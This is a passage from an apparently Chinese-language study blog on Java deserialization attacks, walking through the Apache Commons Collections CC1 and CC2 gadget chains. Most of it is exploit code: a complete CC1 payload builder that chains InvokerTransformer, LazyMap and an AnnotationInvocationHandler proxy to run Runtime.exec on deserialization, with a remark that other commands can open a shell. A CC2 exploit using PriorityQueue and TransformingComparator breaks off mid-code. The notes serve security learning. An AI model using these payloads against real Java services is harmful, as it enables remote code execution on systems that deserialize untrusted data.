var7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个非常典型的反射调用方法的功能</p><p>ConstantTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回某参数。如果去看了它的构造方法就会发现其实transform是一个原封不动返回的功能。</p><p>ChainedTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行一个for循环进行循环调用。对每个传入的transformer都调用其transform方法并作为下一次的参数。</p><p>如果直接抽象点理解，大概是能理解下面的exp的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">                        <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        new Class[] &#123; String.class &#125;, new Object[]&#123;"calc"&#125;)&#125;);</span><br><span class="line">        chain.transform(<span class="number">123</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整体上是一个ChainedTransformer循环调用transform的过程。其中ConstantTransformer获取到Runtime的类，后面循环调用了三个invoke获取方法执行。</p><p>下面细节化的解释下.毕竟cc链子所有命令执行部分都是这条链(没记错的话)</p><p>先说InvokeTransformer的transform方法。上面源码里说明了它主要是一个反射的过程。其接受的参数是一个对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Class cls = input.getClass();</span><br><span class="line">    Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br></pre></td></tr></table></figure><p>最大的好处就是这里所有反射参数都是可控的。所以其实这里就能rce.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Runtime runtime = Runtime.getRuntime();</span><br><span class="line">Transformer invoketransformer = new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"calc"&#125;);</span><br><span class="line">invoketransformer.transform(runtime);</span><br></pre></td></tr></table></figure><p>只不过显然我们没有直接传入一个<code>Runtime.getRuntime()</code>这样一个实例的可能。所以需要利用一下其他的类作辅助。</p><p>比如说上面提到的ConstantTransformer.其transform方法会返回自身。所以说可以</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Object constantTransformer = <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()).transform(<span class="number">123</span>);</span><br><span class="line">Transformer invoketransformer = new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"calc"&#125;);</span><br><span class="line">invoketransformer.transform(constantTransformer);</span><br></pre></td></tr></table></figure><p>再加上ChainedTransform会调用其输入的transform这个特点，我们就可以进一步来到cc反射exp的雏形</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">        new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"calc"&#125;)</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">chain.transform(<span class="number">123</span>);</span><br></pre></td></tr></table></figure><p>此时已不再需要输入变量为对象，而是可以为任意值(此处为123)。</p><p>只不过这里有一个问题，我们曾经说过</p><blockquote><p>java反序列某类时,该类的所有属性必须是可序列化的</p></blockquote><p>此处Runtime.getRuntime()还是返回了runtime对象，它不是可序列化的。即反序列化时上述exp会报错抛出NotSerializableException。</p><p>当然解决方法也很简单，不允许直接获取的话，直接动态调用就好了。也就是继续用反射获取Runtime.<br>所以才有了最完整的exp中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">    new InvokerTransformer("getMethod", new Class[] &#123;</span><br><span class="line">            String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">            <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">            Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">            <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">            new Class[] &#123; String.class &#125;, new Object[]&#123;"calc"&#125;)&#125;);</span><br><span class="line">chain.transform(<span class="number">123</span>);</span><br></pre></td></tr></table></figure><p>第一步反射使用getMethod获取getRuntime这个方法对象。再invoke获取getRuntime的执行结果。最后直接反射执行exec calc.或者传字符串数组执行特殊命令弹shell.</p><p>到这一步为止达成了： <strong>反序列化时执行transform方法即可rce</strong>.下面就是找可用类链子了。因为不可能直接就在readObject里调用transform吧。</p><p>下面是cc1中链子的开始。<br>org.apache.commons.collections.map.LazyMap 它实现了Serializable接口并存在readObject方法。</p><p>LazyMap的get方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">        <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>this.factory.transform(key)</code>就是一个调用了transform的例子。那么只要factory可控就能调用上面的反射rce了。</p><p>看下构造方法。<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/36.PNG" alt><br>虽然只要实例化的话就能控制factory了。但是这不是一个public的构造方法，在java中想要获取到这个构造方法还是得用反射。<br>此时的exp已经可以写成</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">            new InvokerTransformer("getMethod", new Class[] &#123;</span><br><span class="line">                    String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">                    <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                    Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">                    <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                    new Class[] &#123; String.class &#125;, new Object[]&#123;"calc"&#125;)&#125;);</span><br><span class="line">    HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">    Constructor constructor = Class.forName(<span class="string">"org.apache.commons.collections.map.LazyMap"</span>).getDeclaredConstructor(Map<span class="class">.<span class="keyword">class</span>, <span class="title">Transformer</span>.<span class="title">class</span>)</span>;</span><br><span class="line">    constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    LazyMap map = (LazyMap)constructor.newInstance(innermap,chain);</span><br><span class="line">    map.get(<span class="number">123</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>所以，最后也是最难的一点就是找到一个调用get并传递任意值的地方，来调用我们lazymap的get方法。这也就是作者的强大之处。</p><p>jdk1.7版本下找到的是sun.reflect.annotation.AnnotationInvocationHandler<br>注意你直接导入是导不了这个类的。可以在jre的rt.jar 中找到这个\sun\reflect\annotation\AnnotationInvocationHandler.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map var3 = var2.memberTypes();</span><br><span class="line">        Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();</span><br><span class="line">        ......</span><br></pre></td></tr></table></figure><p>注意这里readObject又调用了<code>this.memberValues的entrySet</code>方法。如果这里的memberValues是个代理类，那么就会调用memberValues对应handler的invoke方法，cc1中将handler设置为AnnotationInvocationHandler（其实现了InvocationHandler，所以可以被设置为代理类的handler）</p><p>这也就是java 的动态代理机制。调用entryset这个方法实际上调用的是代理的<code>invoke</code>.<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/37.PNG" alt><br>invoke里又调用了memberValues的get.那么只要令memberValues为我们构造好的Lazymap对象即可</p><p>final exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.bag.HashBag;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.annotation.AnnotationParser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.IdentityHashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(java.lang.Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[]&#123;&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;"calc"&#125;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Constructor constructor = Class.forName(<span class="string">"org.apache.commons.collections.map.LazyMap"</span>).getDeclaredConstructor(Map<span class="class">.<span class="keyword">class</span>, <span class="title">Transformer</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">        Object lazyMap = constructor.newInstance(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler invo = (InvocationHandler) constructor.newInstance(Deprecated<span class="class">.<span class="keyword">class</span>, <span class="title">lazyMap</span>)</span>;</span><br><span class="line">        Object proxy = Proxy.newProxyInstance(invo.getClass().getClassLoader(), <span class="keyword">new</span> Class[]&#123;Map<span class="class">.<span class="keyword">class</span>&#125;, <span class="title">invo</span>)</span>;</span><br><span class="line"></span><br><span class="line">        constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object obj = constructor.newInstance(Deprecated<span class="class">.<span class="keyword">class</span>, <span class="title">proxy</span>)</span>;</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>CommonCollections2</li></ul><p>首先注意是CommonsCollections4的依赖</p><p>起点是<br>java.util.PriorityQueue#readObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    queue = <span class="keyword">new</span> Object[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in "proper order", but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">heapify</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDown</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="keyword">null</span>)</span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDownUsingComparator</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> half = size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="keyword">int</span> child = (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        Object c = queue[child];</span><br><span class="line">        <span class="keyword">int</span> right = child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里queue可控。然后一条链走向heapify =&gt; siftDown =&gt; siftDownUsingComparator =&gt; comparator.compare</p><p>这里就可以开启新的gadget了。比如cc2链子中使用的是<br>org.apache.commons.collections4.comparators.TransformingComparator 的同名compare方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(I obj1, I obj2)</span> </span>&#123;</span><br><span class="line">    O value1 = <span class="keyword">this</span>.transformer.transform(obj1);</span><br><span class="line">    O value2 = <span class="keyword">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>transform方法的作用自然是之前的一套反射组合拳进行rce了。所以需要<code>transformer</code>可控。而从构造方法去看的话会发现也是可控的。</p><p>这里就可以写一个exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">                        <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        new Class[] &#123; String.class 